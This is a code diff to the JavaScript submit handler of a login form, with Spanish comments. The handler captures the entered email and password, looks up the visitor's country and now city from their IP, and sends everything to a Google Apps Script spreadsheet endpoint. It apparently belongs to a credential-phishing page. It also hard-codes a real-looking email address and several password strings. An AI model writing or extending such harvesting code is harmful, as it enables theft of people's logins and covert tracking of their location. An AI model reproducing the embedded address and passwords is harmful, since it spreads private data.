@@ -8,7 +8,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     
     // Lista de correos electrónicos y contraseñas prohibidas
     const prohibitedEmails = ["tamaraganoza417@gmail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["Kiana14_07","kiaraivanna1","Kiaraivanna1"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedWords = ["Kiana14_07"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
@@ -73,22 +73,28 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         deviceType = "iPhone";
     }
     
-    // ✅ Obtener el país del usuario desde la API
+    // ✅ Obtener el país y la ciudad del usuario desde la API
     let country = "Desconocido";
+    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
     try {
         const response = await fetch("https://ipwhois.app/json/");
         const data = await response.json();
-        if (data && data.country) {
-            country = data.country; // Captura el país
+        if (data) {
+            if (data.country) {
+                country = data.country; // Captura el país
+            }
+            if (data.city) {
+                city = data.city; // Captura la ciudad
+            }
         }
     } catch (error) {
-        console.error("Error obteniendo el país:", error);
+        console.error("Error obteniendo la ubicación:", error);
     }
     
     // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
     const formData = new FormData(this);
     formData.append("device", deviceType); // Agregar dispositivo
-    formData.append("country", country); // Agregar país
+    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
     
     // ✅ Enviar los datos correctamente a Google Sheets
     const url = "https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec";
